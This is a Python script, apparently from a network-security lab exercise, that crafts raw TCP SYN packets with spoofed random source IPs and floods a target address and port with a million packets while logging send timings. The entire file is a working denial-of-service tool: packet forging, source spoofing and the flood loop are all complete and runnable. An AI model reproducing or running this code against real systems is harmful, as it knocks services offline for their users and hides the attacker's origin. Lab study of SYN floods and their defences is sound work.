import socket
import struct
import random
import time


def checksum(msg):
    s = 0
    for i in range(0, len(msg), 2):
        w = (msg[i] << 8) + msg[i + 1]
        s = s + w
    s = (s >> 16) + (s & 0xffff)
    s = ~s & 0xffff
    return s


def create_ip_header(src_ip, dst_ip):
    ip_ihl = 5                          # Internet Header Length
    ip_ver = 4                          # IPv4
    ip_tos = 0                          # Type of Service
    ip_tot_len = 20 + 20                # IP header + TCP header
    ip_id = random.randint(1, 65535)    # Random IP ID
    ip_frag_off = 0                     # Fragment Offset
    ip_ttl = 255                        # Time to Live
    ip_proto = socket.IPPROTO_TCP       # Protocol
    ip_check = 0                        # Checksum is 0 for now - will be calculated later
    ip_saddr = socket.inet_aton(src_ip) # Source IP (which we spoof)
    ip_daddr = socket.inet_aton(dst_ip) # Destination IP

    ip_ihl_ver = (ip_ver << 4) + ip_ihl  # IP version and header length

    ip_header = struct.pack('!BBHHHBBH4s4s',
                            ip_ihl_ver, ip_tos, ip_tot_len, ip_id, ip_frag_off,
                            ip_ttl, ip_proto, ip_check, ip_saddr, ip_daddr)

    # Calculate the checksum for the IP header
    ip_check = checksum(ip_header)
    ip_header = struct.pack('!BBHHHBBH4s4s',
                            ip_ihl_ver, ip_tos, ip_tot_len, ip_id, ip_frag_off,
                            ip_ttl, ip_proto, ip_check, ip_saddr, ip_daddr)
    
    return ip_header


def create_tcp_header(src_port, dst_port, src_ip, dst_ip):
    tcp_source = src_port
    tcp_dest = dst_port
    tcp_seq = 0     # sequence number (not used here)
    tcp_ack_seq = 0 # acknowledgement number (not used here)
    tcp_doff = 5    # data offset
    tcp_fin = 0
    tcp_syn = 1     # SYN flag is set to True
    tcp_rst = 0
    tcp_psh = 0
    tcp_ack = 0
    tcp_urg = 0
    tcp_window = socket.htons(5840) # maximum allowed window size
    tcp_check = 0                   # checksum is 0 for now - will be calculated later
    tcp_urg_ptr = 0

    tcp_offset_res = (tcp_doff << 4) + 0    # TCP offset and reserved bits
    tcp_flags = tcp_fin + (tcp_syn << 1) + (tcp_rst << 2) + (tcp_psh << 3) + (tcp_ack << 4) + (tcp_urg << 5)    # TCP flags (6 bits)

    tcp_header = struct.pack('!HHLLBBHHH',
                             tcp_source, tcp_dest, tcp_seq, tcp_ack_seq,
                             tcp_offset_res, tcp_flags, tcp_window, tcp_check, tcp_urg_ptr)     # Construct the TCP header

    # Pseudo header fields for checksum calculation
    placeholder = 0
    protocol = socket.IPPROTO_TCP
    tcp_length = len(tcp_header) 

    # Pseudo header for checksum calculation
    pseudo_header = struct.pack('!4s4sBBH',
                                socket.inet_aton(src_ip), socket.inet_aton(dst_ip), placeholder, protocol, tcp_length) # Construct the pseudo-header

    # Combine pseudo-header, TCP header, and any payload for checksum calculation
    psh = pseudo_header + tcp_header
    tcp_check = checksum(psh)

    # Re-pack TCP header with the correct checksum
    tcp_header = struct.pack('!HHLLBBHHH',
                             tcp_source, tcp_dest, tcp_seq, tcp_ack_seq,
                             tcp_offset_res, tcp_flags, tcp_window, tcp_check, tcp_urg_ptr)    # Construct the TCP header again with the correct checksum

    return tcp_header

'''
    Function to send a SYN flood attack to a target IP and port
    iterations: number of packets to send (used for logging)
'''
def syn_flood(s: socket.socket,target_ip, target_port, num_packets, iterations):
    try:
        with open("syns_results_p.txt", "a+") as log_file:  # Open the log file in append mode to log the results
            for i in range(num_packets):
                # Randomize the source IP and port
                src_ip = f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}"
                src_port = random.randint(1024, 65535)

                ip_header = create_ip_header(src_ip, target_ip)
                tcp_header = create_tcp_header(src_port, target_port, src_ip, target_ip)

                packet = ip_header + tcp_header   # Construct the packet from the IP and TCP headers

                start_time = time.time()
                if(s.sendto(packet, (target_ip, 0)) < 0):
                    print("Error sending packet") # Inform the user if there was an error sending the packet. But won't stop the attack
                end_time = time.time()

                # Calculate the time taken to send the packet and log it
                send_time = end_time - start_time
                send_time_ms = send_time * 1000
                log_file.write(f"{iterations + i} {send_time_ms:.3f} ms\n")

    except IOError as e:
        print(f"Error opening file: {e}")
        return


if __name__ == "__main__":
    print("Starting SYN flood attack...") 
    TARGET_IP = "10.9.0.2"
    TARGET_PORT = 80
    NUM_PACKETS = 10000
    NUM_ITERATIONS = 100
    
    iterations = 0          # Used for logging

    try:
        with open("syns_results_p.txt", "w") as log_file:   # Clear the log file
            log_file.write(f"start time: {time.ctime()}\n")
    except IOError as e:
        print(f"Error opening file: {e}")

    try:
        with socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP) as s:
            s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
            
            start_time = time.time()    # Start time of the attack
            for i in range(NUM_ITERATIONS):     # Send NUM_PACKETS packets in NUM_ITERATIONS iterations
                syn_flood(s,TARGET_IP, TARGET_PORT, NUM_PACKETS, iterations)  # each iteration sends NUM_PACKETS packets
                iterations += NUM_PACKETS
            
            end_time = time.time()    # End time of the attack

    except socket.error as e:
        print(f"Error creating socket: {e}")
        exit(e.errno)

    # Calculate the total time taken and average time per packet
    total_time = end_time - start_time
    total_time_ms = total_time * 1000
    average_time_per_packet_ms = (total_time / (NUM_PACKETS * NUM_ITERATIONS)) * 1000

    # Log the results
    try:
        with open("syns_results_p.txt", "a+") as log_file:
            log_file.write(f"Total packets sent: {NUM_PACKETS * NUM_ITERATIONS}\n")
            log_file.write(f"Total time taken: {total_time_ms:.3f} ms\n")
            log_file.write(f"Average time per packet: {average_time_per_packet_ms:.3f} ms\n")
            log_file.write(f"end time: {time.ctime()}\n")
    except IOError as e:
        print(f"Error opening file: {e}")

    print("Attack completed. Results logged to syns_results_p.txt")